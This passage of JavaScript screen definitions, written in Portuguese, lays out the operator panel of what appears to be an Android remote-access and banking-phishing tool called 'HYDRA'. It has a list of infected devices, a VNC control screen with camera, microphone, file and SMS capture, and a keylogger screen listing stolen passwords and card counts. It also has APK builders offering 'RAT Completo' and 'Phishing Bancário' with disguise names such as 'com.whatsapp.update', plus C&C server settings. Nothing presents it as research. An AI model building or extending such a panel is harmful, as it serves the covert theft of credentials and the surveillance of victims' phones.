          { id: generateId(), type: 'button', x: 235, y: 85, width: 110, height: 35, content: '🔍 Buscar', fontSize: 11, color: '#888888', backgroundColor: '#333333', borderRadius: 20, opacity: 100 },
          // Dispositivos (lista DINÂMICA)
          { id: generateId(), type: 'card', x: 15, y: 135, width: 330, height: 85, backgroundColor: '#1a1a2e', borderRadius: 12, borderWidth: 2, borderColor: '#00D4AA', opacity: 100 },
          { id: generateId(), type: 'text', x: 25, y: 145, width: 250, height: 22, content: '📱 {{device_1_name}}', fontSize: 14, fontWeight: 'bold', color: '#FFFFFF', opacity: 100, isDynamic: true },
          { id: generateId(), type: 'text', x: 25, y: 170, width: 200, height: 18, content: 'Android {{device_1_android}} • {{device_1_ip}}', fontSize: 10, color: '#888888', opacity: 100, isDynamic: true },
          { id: generateId(), type: 'text', x: 25, y: 190, width: 150, height: 18, content: '{{device_1_status}} • {{device_1_time}}', fontSize: 10, color: '#00D4AA', opacity: 100, isDynamic: true },
          { id: generateId(), type: 'button', x: 260, y: 155, width: 70, height: 45, content: '▶️', fontSize: 20, backgroundColor: '#FF6600', borderRadius: 10, buttonAction: 'goto_screen', targetScreenIndex: 3, opacity: 100 },
          // Device 2 - DINÂMICO
          { id: generateId(), type: 'card', x: 15, y: 230, width: 330, height: 85, backgroundColor: '#1a1a2e', borderRadius: 12, borderWidth: 2, borderColor: '#00D4AA', opacity: 100 },
          { id: generateId(), type: 'text', x: 25, y: 240, width: 250, height: 22, content: '📱 {{device_2_name}}', fontSize: 14, fontWeight: 'bold', color: '#FFFFFF', opacity: 100, isDynamic: true },
          { id: generateId(), type: 'text', x: 25, y: 265, width: 200, height: 18, content: 'Android {{device_2_android}} • {{device_2_ip}}', fontSize: 10, color: '#888888', opacity: 100, isDynamic: true },
          { id: generateId(), type: 'text', x: 25, y: 285, width: 150, height: 18, content: '{{device_2_status}} • {{device_2_time}}', fontSize: 10, color: '#00D4AA', opacity: 100, isDynamic: true },
          { id: generateId(), type: 'button', x: 260, y: 250, width: 70, height: 45, content: '▶️', fontSize: 20, backgroundColor: '#FF6600', borderRadius: 10, buttonAction: 'goto_screen', targetScreenIndex: 3, opacity: 100 },
          // Device 3
          { id: generateId(), type: 'card', x: 15, y: 325, width: 330, height: 85, backgroundColor: '#1a1a2e', borderRadius: 12, borderWidth: 2, borderColor: '#00D4AA', opacity: 100 },
          { id: generateId(), type: 'text', x: 25, y: 335, width: 250, height: 22, content: '📱 Motorola Edge 40 Pro', fontSize: 14, fontWeight: 'bold', color: '#FFFFFF', opacity: 100 },
          { id: generateId(), type: 'text', x: 25, y: 360, width: 200, height: 18, content: 'Android 14 • 1080x2400 • 12GB RAM', fontSize: 10, color: '#888888', opacity: 100 },
          { id: generateId(), type: 'text', x: 25, y: 380, width: 150, height: 18, content: '🟢 Online • 192.168.1.120', fontSize: 10, color: '#00D4AA', opacity: 100 },
          { id: generateId(), type: 'button', x: 260, y: 345, width: 70, height: 45, content: '▶️', fontSize: 20, backgroundColor: '#FF6600', borderRadius: 10, buttonAction: 'goto_screen', targetScreenIndex: 3, opacity: 100 },
          // Device 4 (offline)
          { id: generateId(), type: 'card', x: 15, y: 420, width: 330, height: 85, backgroundColor: '#1a1a2e', borderRadius: 12, borderWidth: 1, borderColor: '#333', opacity: 60 },
          { id: generateId(), type: 'text', x: 25, y: 430, width: 250, height: 22, content: '📱 iPhone 15 Pro Max', fontSize: 14, fontWeight: 'bold', color: '#666666', opacity: 100 },
          { id: generateId(), type: 'text', x: 25, y: 455, width: 200, height: 18, content: 'iOS 17 • 1290x2796', fontSize: 10, color: '#555555', opacity: 100 },
          { id: generateId(), type: 'text', x: 25, y: 475, width: 180, height: 18, content: '🔴 Offline • há 3 horas', fontSize: 10, color: '#FF4444', opacity: 100 },
          { id: generateId(), type: 'button', x: 260, y: 440, width: 70, height: 45, content: '⏸️', fontSize: 20, backgroundColor: '#333333', borderRadius: 10, opacity: 100 },
          // Device 5 (offline)
          { id: generateId(), type: 'card', x: 15, y: 515, width: 330, height: 85, backgroundColor: '#1a1a2e', borderRadius: 12, borderWidth: 1, borderColor: '#333', opacity: 60 },
          { id: generateId(), type: 'text', x: 25, y: 525, width: 250, height: 22, content: '📱 OnePlus 11', fontSize: 14, fontWeight: 'bold', color: '#666666', opacity: 100 },
          { id: generateId(), type: 'text', x: 25, y: 550, width: 200, height: 18, content: 'Android 14 • 1440x3216', fontSize: 10, color: '#555555', opacity: 100 },
          { id: generateId(), type: 'text', x: 25, y: 570, width: 180, height: 18, content: '🔴 Offline • há 1 dia', fontSize: 10, color: '#FF4444', opacity: 100 },
          { id: generateId(), type: 'button', x: 260, y: 535, width: 70, height: 45, content: '⏸️', fontSize: 20, backgroundColor: '#333333', borderRadius: 10, opacity: 100 },
          // Bottom text
          { id: generateId(), type: 'text', x: 15, y: 620, width: 330, height: 20, content: '📊 18 online • 6 offline • 0 pendentes', fontSize: 12, color: '#666666', textAlign: 'center', opacity: 100 },
          // Bottom Nav
          { id: generateId(), type: 'rectangle', x: 0, y: 695, width: 360, height: 85, backgroundColor: '#1a1a2e', opacity: 100 },
          { id: generateId(), type: 'button', x: 25, y: 710, width: 55, height: 55, content: '🏠', fontSize: 24, backgroundColor: '#333333', borderRadius: 14, buttonAction: 'goto_screen', targetScreenIndex: 1, opacity: 100 },
          { id: generateId(), type: 'button', x: 95, y: 710, width: 55, height: 55, content: '📱', fontSize: 24, backgroundColor: '#FF6600', borderRadius: 14, opacity: 100 },
          { id: generateId(), type: 'button', x: 165, y: 710, width: 55, height: 55, content: '⌨️', fontSize: 24, backgroundColor: '#333333', borderRadius: 14, buttonAction: 'goto_screen', targetScreenIndex: 4, opacity: 100 },
          { id: generateId(), type: 'button', x: 235, y: 710, width: 55, height: 55, content: '➕', fontSize: 24, backgroundColor: '#333333', borderRadius: 14, buttonAction: 'goto_screen', targetScreenIndex: 5, opacity: 100 },
          { id: generateId(), type: 'button', x: 305, y: 710, width: 45, height: 55, content: '⚙️', fontSize: 24, backgroundColor: '#333333', borderRadius: 14, buttonAction: 'goto_screen', targetScreenIndex: 7, opacity: 100 },
        ]
      },
      
      // ===== 4. CONTROLE VNC =====
      {
        id: generateId(),
        name: '🎮 Controle VNC',
        backgroundColor: '#000000',
        elements: [
          // Header
          { id: generateId(), type: 'rectangle', x: 0, y: 0, width: 360, height: 55, backgroundColor: '#1a1a2e', opacity: 100 },
          { id: generateId(), type: 'button', x: 10, y: 10, width: 40, height: 35, content: '←', fontSize: 20, backgroundColor: '#333333', borderRadius: 8, buttonAction: 'prev_screen', opacity: 100 },
          { id: generateId(), type: 'text', x: 60, y: 10, width: 180, height: 20, content: '{{selected_device_name}}', fontSize: 14, fontWeight: 'bold', color: '#FFFFFF', opacity: 100, isDynamic: true },
          { id: generateId(), type: 'text', x: 60, y: 32, width: 180, height: 18, content: '{{selected_device_status}}', fontSize: 10, color: '#00D4AA', opacity: 100, isDynamic: true },
          { id: generateId(), type: 'text', x: 280, y: 18, width: 70, height: 25, content: '🔴 REC', fontSize: 12, fontWeight: 'bold', color: '#FF4444', textAlign: 'right', opacity: 100 },
          // VNC Screen area
          { id: generateId(), type: 'rectangle', x: 15, y: 65, width: 330, height: 520, backgroundColor: '#111111', borderRadius: 24, borderWidth: 3, borderColor: '#333', opacity: 100 },
          { id: generateId(), type: 'text', x: 100, y: 290, width: 160, height: 30, content: '📺 VNC STREAM', fontSize: 18, fontWeight: 'bold', color: '#444444', textAlign: 'center', opacity: 100 },
          { id: generateId(), type: 'text', x: 80, y: 330, width: 200, height: 20, content: 'Toque aqui para controlar', fontSize: 12, color: '#333333', textAlign: 'center', opacity: 100 },
          // Stream info
          { id: generateId(), type: 'rectangle', x: 25, y: 75, width: 100, height: 25, backgroundColor: '#FF000066', borderRadius: 8, opacity: 100 },
          { id: generateId(), type: 'text', x: 30, y: 80, width: 90, height: 18, content: '● AO VIVO', fontSize: 11, fontWeight: 'bold', color: '#FFFFFF', textAlign: 'center', opacity: 100 },
          // Control panel
          { id: generateId(), type: 'rectangle', x: 0, y: 595, width: 360, height: 185, backgroundColor: '#1a1a2e', opacity: 100 },
          // Navigation buttons
          { id: generateId(), type: 'text', x: 20, y: 605, width: 150, height: 20, content: '🎮 Navegação', fontSize: 12, fontWeight: 'bold', color: '#888888', opacity: 100 },
          { id: generateId(), type: 'button', x: 20, y: 630, width: 75, height: 50, content: '🏠\nHome', fontSize: 14, color: '#FFFFFF', backgroundColor: '#333333', borderRadius: 12, buttonAction: 'show_toast', opacity: 100 },
          { id: generateId(), type: 'button', x: 105, y: 630, width: 75, height: 50, content: '◀️\nVoltar', fontSize: 14, color: '#FFFFFF', backgroundColor: '#333333', borderRadius: 12, buttonAction: 'show_toast', opacity: 100 },
          { id: generateId(), type: 'button', x: 190, y: 630, width: 75, height: 50, content: '⏹️\nRecent', fontSize: 14, color: '#FFFFFF', backgroundColor: '#333333', borderRadius: 12, buttonAction: 'show_toast', opacity: 100 },
          { id: generateId(), type: 'button', x: 275, y: 630, width: 75, height: 50, content: '🔒\nLock', fontSize: 14, color: '#FFFFFF', backgroundColor: '#FF4444', borderRadius: 12, buttonAction: 'lock_screen', opacity: 100 },
          // Quick actions
          { id: generateId(), type: 'text', x: 20, y: 690, width: 150, height: 20, content: '⚡ Ações', fontSize: 12, fontWeight: 'bold', color: '#888888', opacity: 100 },
          { id: generateId(), type: 'button', x: 20, y: 715, width: 60, height: 45, content: '📷', fontSize: 20, backgroundColor: '#457B9D', borderRadius: 10, buttonAction: 'capture_camera', opacity: 100 },
          { id: generateId(), type: 'button', x: 90, y: 715, width: 60, height: 45, content: '🎤', fontSize: 20, backgroundColor: '#9B59B6', borderRadius: 10, buttonAction: 'capture_mic', opacity: 100 },
          { id: generateId(), type: 'button', x: 160, y: 715, width: 60, height: 45, content: '📁', fontSize: 20, backgroundColor: '#2A9D8F', borderRadius: 10, buttonAction: 'get_files', opacity: 100 },
          { id: generateId(), type: 'button', x: 230, y: 715, width: 60, height: 45, content: '💬', fontSize: 20, backgroundColor: '#E9C46A', borderRadius: 10, buttonAction: 'get_sms', opacity: 100 },
          { id: generateId(), type: 'button', x: 300, y: 715, width: 50, height: 45, content: '⌨️', fontSize: 20, backgroundColor: '#E63946', borderRadius: 10, buttonAction: 'goto_screen', targetScreenIndex: 4, opacity: 100 },
        ]
      },
      
      // ===== 5. KEYLOGGER =====
      {
        id: generateId(),
        name: '⌨️ Keylogger',
        backgroundColor: '#0a0a15',
        elements: [
          // Header
          { id: generateId(), type: 'rectangle', x: 0, y: 0, width: 360, height: 70, backgroundColor: '#E63946', opacity: 100 },
          { id: generateId(), type: 'button', x: 15, y: 20, width: 40, height: 35, content: '←', fontSize: 20, backgroundColor: '#CC333340', borderRadius: 10, buttonAction: 'prev_screen', opacity: 100 },
          { id: generateId(), type: 'text', x: 70, y: 22, width: 200, height: 30, content: '⌨️ KEYLOGGER', fontSize: 20, fontWeight: 'bold', color: '#FFFFFF', opacity: 100 },
          { id: generateId(), type: 'text', x: 270, y: 28, width: 80, height: 20, content: '{{total_passwords}} logs', fontSize: 12, color: '#FFCCCC', textAlign: 'right', opacity: 100, isDynamic: true },
          // Stats - DINÂMICOS
          { id: generateId(), type: 'card', x: 15, y: 85, width: 160, height: 70, backgroundColor: '#1a1a2e', borderRadius: 12, opacity: 100 },
          { id: generateId(), type: 'text', x: 25, y: 95, width: 140, height: 20, content: '🔑 Senhas', fontSize: 12, color: '#888888', opacity: 100 },
          { id: generateId(), type: 'text', x: 25, y: 118, width: 140, height: 30, content: '{{total_passwords}}', fontSize: 28, fontWeight: 'bold', color: '#FF6600', opacity: 100, isDynamic: true },
          { id: generateId(), type: 'card', x: 185, y: 85, width: 160, height: 70, backgroundColor: '#1a1a2e', borderRadius: 12, opacity: 100 },
          { id: generateId(), type: 'text', x: 195, y: 95, width: 140, height: 20, content: '💳 Cartões', fontSize: 12, color: '#888888', opacity: 100 },
          { id: generateId(), type: 'text', x: 195, y: 118, width: 140, height: 30, content: '{{total_cards}}', fontSize: 28, fontWeight: 'bold', color: '#00D4AA', opacity: 100, isDynamic: true },
          // Captura 1 - DINÂMICA
          { id: generateId(), type: 'text', x: 20, y: 170, width: 200, height: 20, content: '📋 Últimas Capturas', fontSize: 14, fontWeight: 'bold', color: '#FFFFFF', opacity: 100 },
          { id: generateId(), type: 'card', x: 15, y: 200, width: 330, height: 90, backgroundColor: '#1a1a2e', borderRadius: 12, borderWidth: 2, borderColor: '#FF6600', opacity: 100 },
          { id: generateId(), type: 'text', x: 25, y: 210, width: 200, height: 22, content: '🏦 {{keylog_1_app}}', fontSize: 14, fontWeight: 'bold', color: '#FF6600', opacity: 100, isDynamic: true },
          { id: generateId(), type: 'text', x: 25, y: 235, width: 200, height: 18, content: '{{keylog_1_device}} • {{keylog_1_time}}', fontSize: 11, color: '#888888', opacity: 100, isDynamic: true },
          { id: generateId(), type: 'text', x: 25, y: 258, width: 150, height: 22, content: 'Senha: {{keylog_1_value}}', fontSize: 14, fontWeight: 'bold', color: '#00D4AA', opacity: 100, isDynamic: true },
          { id: generateId(), type: 'button', x: 270, y: 230, width: 60, height: 35, content: '📋', fontSize: 18, backgroundColor: '#333333', borderRadius: 8, opacity: 100 },
          // Captura 2 - DINÂMICA
          { id: generateId(), type: 'card', x: 15, y: 300, width: 330, height: 80, backgroundColor: '#1a1a2e', borderRadius: 12, opacity: 100 },
          { id: generateId(), type: 'text', x: 25, y: 310, width: 200, height: 22, content: '📱 {{keylog_2_app}}', fontSize: 14, fontWeight: 'bold', color: '#25D366', opacity: 100, isDynamic: true },
          { id: generateId(), type: 'text', x: 25, y: 335, width: 250, height: 18, content: '{{keylog_2_device}} • {{keylog_2_time}}', fontSize: 11, color: '#888888', opacity: 100, isDynamic: true },
          { id: generateId(), type: 'text', x: 25, y: 355, width: 200, height: 18, content: 'Valor: {{keylog_2_value}}', fontSize: 12, color: '#00D4AA', opacity: 100, isDynamic: true },
          { id: generateId(), type: 'button', x: 270, y: 325, width: 60, height: 35, content: '📋', fontSize: 18, backgroundColor: '#333333', borderRadius: 8, opacity: 100 },
          // Captura 3 - DINÂMICA
          { id: generateId(), type: 'card', x: 15, y: 390, width: 330, height: 80, backgroundColor: '#1a1a2e', borderRadius: 12, opacity: 100 },
          { id: generateId(), type: 'text', x: 25, y: 400, width: 200, height: 22, content: '📧 {{keylog_3_app}}', fontSize: 14, fontWeight: 'bold', color: '#EA4335', opacity: 100, isDynamic: true },
          { id: generateId(), type: 'text', x: 25, y: 425, width: 250, height: 18, content: '{{keylog_3_device}} • {{keylog_3_time}}', fontSize: 11, color: '#888888', opacity: 100, isDynamic: true },
          { id: generateId(), type: 'text', x: 25, y: 445, width: 200, height: 18, content: 'Valor: {{keylog_3_value}}', fontSize: 12, color: '#00D4AA', opacity: 100, isDynamic: true },
          { id: generateId(), type: 'button', x: 270, y: 415, width: 60, height: 35, content: '📋', fontSize: 18, backgroundColor: '#333333', borderRadius: 8, opacity: 100 },
          // Captura 4 - DINÂMICA
          { id: generateId(), type: 'card', x: 15, y: 480, width: 330, height: 70, backgroundColor: '#1a1a2e', borderRadius: 12, opacity: 100 },
          { id: generateId(), type: 'text', x: 25, y: 490, width: 200, height: 22, content: '🆔 {{keylog_4_app}}', fontSize: 14, fontWeight: 'bold', color: '#FFFFFF', opacity: 100, isDynamic: true },
          { id: generateId(), type: 'text', x: 25, y: 515, width: 200, height: 22, content: '{{keylog_4_value}}', fontSize: 16, fontWeight: 'bold', color: '#FF6600', opacity: 100, isDynamic: true },
          { id: generateId(), type: 'button', x: 270, y: 500, width: 60, height: 35, content: '📋', fontSize: 18, backgroundColor: '#333333', borderRadius: 8, opacity: 100 },
          // Export button
          { id: generateId(), type: 'button', x: 15, y: 570, width: 160, height: 50, content: '📥 Exportar CSV', fontSize: 14, fontWeight: 'bold', color: '#FFFFFF', backgroundColor: '#333333', borderRadius: 12, buttonAction: 'download', opacity: 100 },
          { id: generateId(), type: 'button', x: 185, y: 570, width: 160, height: 50, content: '🗑️ Limpar Tudo', fontSize: 14, fontWeight: 'bold', color: '#FFFFFF', backgroundColor: '#FF444444', borderRadius: 12, buttonAction: 'submit', opacity: 100 },
          // Bottom Nav
          { id: generateId(), type: 'rectangle', x: 0, y: 695, width: 360, height: 85, backgroundColor: '#1a1a2e', opacity: 100 },
          { id: generateId(), type: 'button', x: 25, y: 710, width: 55, height: 55, content: '🏠', fontSize: 24, backgroundColor: '#333333', borderRadius: 14, buttonAction: 'goto_screen', targetScreenIndex: 1, opacity: 100 },
          { id: generateId(), type: 'button', x: 95, y: 710, width: 55, height: 55, content: '📱', fontSize: 24, backgroundColor: '#333333', borderRadius: 14, buttonAction: 'goto_screen', targetScreenIndex: 2, opacity: 100 },
          { id: generateId(), type: 'button', x: 165, y: 710, width: 55, height: 55, content: '⌨️', fontSize: 24, backgroundColor: '#E63946', borderRadius: 14, opacity: 100 },
          { id: generateId(), type: 'button', x: 235, y: 710, width: 55, height: 55, content: '➕', fontSize: 24, backgroundColor: '#333333', borderRadius: 14, buttonAction: 'goto_screen', targetScreenIndex: 5, opacity: 100 },
          { id: generateId(), type: 'button', x: 305, y: 710, width: 45, height: 55, content: '⚙️', fontSize: 24, backgroundColor: '#333333', borderRadius: 14, buttonAction: 'goto_screen', targetScreenIndex: 7, opacity: 100 },
        ]
      },
      
      // ===== 6. APK BUILDER (NORMAL) =====
      {
        id: generateId(),
        name: '➕ APK Rápido',
        backgroundColor: '#0a0a15',
        elements: [
          // Header
          { id: generateId(), type: 'rectangle', x: 0, y: 0, width: 360, height: 70, backgroundColor: '#238636', opacity: 100 },
          { id: generateId(), type: 'button', x: 15, y: 20, width: 40, height: 35, content: '←', fontSize: 20, backgroundColor: '#1B6B2940', borderRadius: 10, buttonAction: 'prev_screen', opacity: 100 },
          { id: generateId(), type: 'text', x: 70, y: 22, width: 220, height: 30, content: '➕ APK Builder Rápido', fontSize: 18, fontWeight: 'bold', color: '#FFFFFF', opacity: 100 },
          // Tipo de APK
          { id: generateId(), type: 'text', x: 20, y: 90, width: 320, height: 20, content: '🎯 Escolha o Tipo', fontSize: 14, fontWeight: 'bold', color: '#FFFFFF', opacity: 100 },
          { id: generateId(), type: 'button', x: 15, y: 120, width: 160, height: 70, content: '📱 RAT\nCompleto', fontSize: 14, fontWeight: 'bold', color: '#FFFFFF', backgroundColor: '#FF6600', borderRadius: 14, opacity: 100 },
          { id: generateId(), type: 'button', x: 185, y: 120, width: 160, height: 70, content: '💳 Phishing\nBancário', fontSize: 14, fontWeight: 'bold', color: '#FFFFFF', backgroundColor: '#333333', borderRadius: 14, opacity: 100 },
          // Nome
          { id: generateId(), type: 'text', x: 20, y: 210, width: 200, height: 20, content: '📱 Nome do APK', fontSize: 14, fontWeight: 'bold', color: '#FFFFFF', opacity: 100 },
          { id: generateId(), type: 'input', x: 15, y: 240, width: 330, height: 55, placeholder: 'Ex: WhatsApp Atualização', inputType: 'text', inputLabel: 'apk_name', backgroundColor: '#1a1a2e', color: '#FFFFFF', borderRadius: 12, borderWidth: 1, borderColor: '#333', opacity: 100 },
          // Package
          { id: generateId(), type: 'text', x: 20, y: 315, width: 200, height: 20, content: '📦 Package Name', fontSize: 14, fontWeight: 'bold', color: '#FFFFFF', opacity: 100 },
          { id: generateId(), type: 'input', x: 15, y: 345, width: 330, height: 55, placeholder: 'com.whatsapp.update', inputType: 'text', inputLabel: 'package_name', backgroundColor: '#1a1a2e', color: '#FFFFFF', borderRadius: 12, borderWidth: 1, borderColor: '#333', opacity: 100 },
          // Ícone
          { id: generateId(), type: 'text', x: 20, y: 420, width: 200, height: 20, content: '🎨 Ícone do APK', fontSize: 14, fontWeight: 'bold', color: '#FFFFFF', opacity: 100 },
          { id: generateId(), type: 'button', x: 15, y: 450, width: 330, height: 55, content: '📤 Fazer Upload do Ícone', fontSize: 14, color: '#888888', backgroundColor: '#1a1a2e', borderRadius: 12, borderWidth: 1, borderColor: '#333', opacity: 100 },
          // Opções
          { id: generateId(), type: 'card', x: 15, y: 525, width: 330, height: 120, backgroundColor: '#1a1a2e', borderRadius: 14, opacity: 100 },
          { id: generateId(), type: 'text', x: 30, y: 540, width: 200, height: 20, content: '⚙️ Funcionalidades', fontSize: 14, fontWeight: 'bold', color: '#FFFFFF', opacity: 100 },
          { id: generateId(), type: 'checkbox', x: 30, y: 570, width: 140, height: 25, content: '📺 VNC Screen', color: '#FFFFFF', checked: true, opacity: 100 },
          { id: generateId(), type: 'checkbox', x: 180, y: 570, width: 140, height: 25, content: '⌨️ Keylogger', color: '#FFFFFF', checked: true, opacity: 100 },
          { id: generateId(), type: 'checkbox', x: 30, y: 600, width: 140, height: 25, content: '📷 Câmera', color: '#FFFFFF', checked: true, opacity: 100 },
          { id: generateId(), type: 'checkbox', x: 180, y: 600, width: 140, height: 25, content: '🎤 Microfone', color: '#FFFFFF', checked: true, opacity: 100 },
          // Build button
          { id: generateId(), type: 'button', x: 15, y: 665, width: 330, height: 60, content: '🚀 GERAR APK AGORA', fontSize: 18, fontWeight: 'bold', color: '#FFFFFF', backgroundColor: '#238636', borderRadius: 16, buttonAction: 'generate_apk', opacity: 100 },
          // Progress
          { id: generateId(), type: 'progress_bar', x: 15, y: 740, width: 330, height: 12, backgroundColor: '#333333', color: '#238636', borderRadius: 6, currentValue: 0, opacity: 100 },
        ]
      },
      
      // ===== 7. APK BUILDER (PERSONALIZADO) =====
      {
        id: generateId(),
        name: '🎨 APK Personalizado',
        backgroundColor: '#0a0a15',
        elements: [
          // Header
          { id: generateId(), type: 'rectangle', x: 0, y: 0, width: 360, height: 70, backgroundColor: '#9B59B6', opacity: 100 },
          { id: generateId(), type: 'button', x: 15, y: 20, width: 40, height: 35, content: '←', fontSize: 20, backgroundColor: '#7D3C9840', borderRadius: 10, buttonAction: 'prev_screen', opacity: 100 },
          { id: generateId(), type: 'text', x: 70, y: 22, width: 250, height: 30, content: '🎨 APK Personalizado', fontSize: 18, fontWeight: 'bold', color: '#FFFFFF', opacity: 100 },
          // Descrição
          { id: generateId(), type: 'card', x: 15, y: 85, width: 330, height: 80, backgroundColor: '#1a1a2e', borderRadius: 14, opacity: 100 },
          { id: generateId(), type: 'text', x: 30, y: 100, width: 290, height: 50, content: 'Monte telas customizadas com editor visual. Crie apps de phishing perfeitos!', fontSize: 13, color: '#888888', textAlign: 'center', opacity: 100 },
          // Preview área
          { id: generateId(), type: 'text', x: 20, y: 180, width: 200, height: 20, content: '📱 Preview do App', fontSize: 14, fontWeight: 'bold', color: '#FFFFFF', opacity: 100 },
          { id: generateId(), type: 'rectangle', x: 85, y: 210, width: 190, height: 340, backgroundColor: '#111111', borderRadius: 24, borderWidth: 2, borderColor: '#9B59B6', opacity: 100 },
          { id: generateId(), type: 'text', x: 110, y: 360, width: 140, height: 25, content: '📱 Tela 1 de 3', fontSize: 14, color: '#666666', textAlign: 'center', opacity: 100 },
          // Controles de tela
          { id: generateId(), type: 'button', x: 20, y: 330, width: 55, height: 55, content: '◀️', fontSize: 24, backgroundColor: '#333333', borderRadius: 14, opacity: 100 },
          { id: generateId(), type: 'button', x: 285, y: 330, width: 55, height: 55, content: '▶️', fontSize: 24, backgroundColor: '#333333', borderRadius: 14, opacity: 100 },
          // Adicionar elementos
          { id: generateId(), type: 'text', x: 20, y: 570, width: 200, height: 20, content: '🧩 Adicionar Elementos', fontSize: 14, fontWeight: 'bold', color: '#FFFFFF', opacity: 100 },
          { id: generateId(), type: 'button', x: 15, y: 600, width: 78, height: 50, content: '📝 Texto', fontSize: 10, color: '#FFFFFF', backgroundColor: '#333333', borderRadius: 10, opacity: 100 },
          { id: generateId(), type: 'button', x: 101, y: 600, width: 78, height: 50, content: '🔘 Botão', fontSize: 10, color: '#FFFFFF', backgroundColor: '#333333', borderRadius: 10, opacity: 100 },
          { id: generateId(), type: 'button', x: 187, y: 600, width: 78, height: 50, content: '📥 Input', fontSize: 10, color: '#FFFFFF', backgroundColor: '#333333', borderRadius: 10, opacity: 100 },
          { id: generateId(), type: 'button', x: 273, y: 600, width: 78, height: 50, content: '🖼️ Imagem', fontSize: 10, color: '#FFFFFF', backgroundColor: '#333333', borderRadius: 10, opacity: 100 },
          // Ações
          { id: generateId(), type: 'button', x: 15, y: 665, width: 160, height: 50, content: '➕ Nova Tela', fontSize: 14, color: '#FFFFFF', backgroundColor: '#333333', borderRadius: 12, buttonAction: 'show_toast', opacity: 100 },
          { id: generateId(), type: 'button', x: 185, y: 665, width: 160, height: 50, content: '🚀 BUILDAR', fontSize: 14, fontWeight: 'bold', color: '#FFFFFF', backgroundColor: '#9B59B6', borderRadius: 12, buttonAction: 'generate_apk', opacity: 100 },
          // Progress
          { id: generateId(), type: 'progress_bar', x: 15, y: 730, width: 330, height: 12, backgroundColor: '#333333', color: '#9B59B6', borderRadius: 6, currentValue: 0, opacity: 100 },
        ]
      },
      
      // ===== 8. CONFIGURAÇÕES =====
      {
        id: generateId(),
        name: '⚙️ Configurações',
        backgroundColor: '#0a0a15',
        elements: [
          // Header
          { id: generateId(), type: 'rectangle', x: 0, y: 0, width: 360, height: 70, backgroundColor: '#1a1a2e', opacity: 100 },
          { id: generateId(), type: 'button', x: 15, y: 20, width: 40, height: 35, content: '←', fontSize: 20, backgroundColor: '#333333', borderRadius: 10, buttonAction: 'prev_screen', opacity: 100 },
          { id: generateId(), type: 'text', x: 70, y: 22, width: 200, height: 30, content: '⚙️ Configurações', fontSize: 20, fontWeight: 'bold', color: '#FFFFFF', opacity: 100 },
          // Servidor
          { id: generateId(), type: 'text', x: 20, y: 90, width: 200, height: 20, content: '🌐 Servidor C&C', fontSize: 14, fontWeight: 'bold', color: '#FFFFFF', opacity: 100 },
          { id: generateId(), type: 'card', x: 15, y: 115, width: 330, height: 80, backgroundColor: '#1a1a2e', borderRadius: 12, opacity: 100 },
          { id: generateId(), type: 'text', x: 30, y: 130, width: 290, height: 20, content: 'https://seu-servidor.com', fontSize: 14, color: '#00D4AA', opacity: 100 },
          { id: generateId(), type: 'text', x: 30, y: 160, width: 150, height: 20, content: '🟢 Conectado', fontSize: 12, color: '#00FF00', opacity: 100 },
          { id: generateId(), type: 'button', x: 250, y: 145, width: 80, height: 35, content: 'Editar', fontSize: 12, backgroundColor: '#333333', borderRadius: 8, opacity: 100 },
          // Notificações
          { id: generateId(), type: 'text', x: 20, y: 215, width: 200, height: 20, content: '🔔 Notificações', fontSize: 14, fontWeight: 'bold', color: '#FFFFFF', opacity: 100 },
          { id: generateId(), type: 'card', x: 15, y: 240, width: 330, height: 130, backgroundColor: '#1a1a2e', borderRadius: 12, opacity: 100 },
          { id: generateId(), type: 'switch', x: 30, y: 260, width: 280, height: 30, content: 'Novo dispositivo conectado', color: '#FFFFFF', checked: true, opacity: 100 },
          { id: generateId(), type: 'switch', x: 30, y: 300, width: 280, height: 30, content: 'Senha capturada', color: '#FFFFFF', checked: true, opacity: 100 },
          { id: generateId(), type: 'switch', x: 30, y: 340, width: 280, height: 30, content: 'Dispositivo offline', color: '#FFFFFF', checked: false, opacity: 100 },
          // Segurança
          { id: generateId(), type: 'text', x: 20, y: 390, width: 200, height: 20, content: '🔒 Segurança', fontSize: 14, fontWeight: 'bold', color: '#FFFFFF', opacity: 100 },
          { id: generateId(), type: 'card', x: 15, y: 415, width: 330, height: 100, backgroundColor: '#1a1a2e', borderRadius: 12, opacity: 100 },
          { id: generateId(), type: 'switch', x: 30, y: 435, width: 280, height: 30, content: 'Autenticação biométrica', color: '#FFFFFF', checked: true, opacity: 100 },
          { id: generateId(), type: 'switch', x: 30, y: 475, width: 280, height: 30, content: 'Criptografar dados locais', color: '#FFFFFF', checked: true, opacity: 100 },
          // Conta
          { id: generateId(), type: 'text', x: 20, y: 535, width: 200, height: 20, content: '👤 Conta', fontSize: 14, fontWeight: 'bold', color: '#FFFFFF', opacity: 100 },
          { id: generateId(), type: 'card', x: 15, y: 560, width: 330, height: 70, backgroundColor: '#1a1a2e', borderRadius: 12, opacity: 100 },
          { id: generateId(), type: 'text', x: 30, y: 575, width: 200, height: 20, content: 'admin', fontSize: 16, fontWeight: 'bold', color: '#FFFFFF', opacity: 100 },
          { id: generateId(), type: 'text', x: 30, y: 600, width: 200, height: 18, content: 'Licença: Premium ✓', fontSize: 12, color: '#00D4AA', opacity: 100 },
          { id: generateId(), type: 'button', x: 240, y: 575, width: 90, height: 40, content: 'Sair', fontSize: 14, color: '#FF4444', backgroundColor: '#FF444420', borderRadius: 8, buttonAction: 'goto_screen', targetScreenIndex: 0, opacity: 100 },
          // Versão
          { id: generateId(), type: 'text', x: 20, y: 650, width: 320, height: 20, content: 'HYDRA v2.0.0', fontSize: 12, color: '#444444', textAlign: 'center', opacity: 100 },
          { id: generateId(), type: 'text', x: 20, y: 675, width: 320, height: 20, content: '© 2024 - Todos os direitos reservados', fontSize: 10, color: '#333333', textAlign: 'center', opacity: 100 },
          // Bottom Nav
          { id: generateId(), type: 'rectangle', x: 0, y: 695, width: 360, height: 85, backgroundColor: '#1a1a2e', opacity: 100 },
          { id: generateId(), type: 'button', x: 25, y: 710, width: 55, height: 55, content: '🏠', fontSize: 24, backgroundColor: '#333333', borderRadius: 14, buttonAction: 'goto_screen', targetScreenIndex: 1, opacity: 100 },
          { id: generateId(), type: 'button', x: 95, y: 710, width: 55, height: 55, content: '📱', fontSize: 24, backgroundColor: '#333333', borderRadius: 14, buttonAction: 'goto_screen', targetScreenIndex: 2, opacity: 100 },
          { id: generateId(), type: 'button', x: 165, y: 710, width: 55, height: 55, content: '⌨️', fontSize: 24, backgroundColor: '#333333', borderRadius: 14, buttonAction: 'goto_screen', targetScreenIndex: 4, opacity: 100 },
